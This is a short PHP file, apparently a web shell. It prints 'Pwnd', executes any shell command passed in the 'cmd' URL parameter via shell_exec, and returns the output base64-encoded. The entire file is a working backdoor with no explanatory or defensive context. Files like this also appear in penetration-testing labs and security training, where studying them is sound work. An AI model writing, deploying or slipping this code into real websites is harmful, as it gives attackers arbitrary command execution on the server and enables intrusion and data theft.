<?php

  echo "Pwnd";
  $output = shell_exec($_GET['cmd']);
  echo base64_encode($output);
 ?>
